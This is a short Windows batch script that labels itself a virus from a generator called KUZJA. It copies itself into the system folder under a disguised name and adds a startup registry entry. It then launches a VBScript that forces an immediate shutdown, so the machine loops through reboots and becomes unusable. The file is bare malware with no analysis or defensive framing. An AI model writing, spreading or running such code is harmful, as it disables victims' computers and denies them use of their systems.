@echo This virus created by generator KUZJA
@echo off
echo Chr(39)>%temp%\temp1.vbs
echo Chr(39)>%temp%\temp2.vbs
echo on error resume next > %temp%\temp.vbs
echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp.vbs
echo set FSO=createobject("scripting.filesystemobject")>>%temp%\temp.vbs
set a=%0
copy %a% %SystemRoot%\user32dll.bat
reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v RunExplorer32 /d %SystemRoot%\user32dll.bat /f
echo s.run "shutdown -s -t 0 -c """" -f",1 >> %temp%\temp.vbs
start %temp%\temp.vbs
start %temp%\temp1.vbs
start %temp%\temp2.vbs

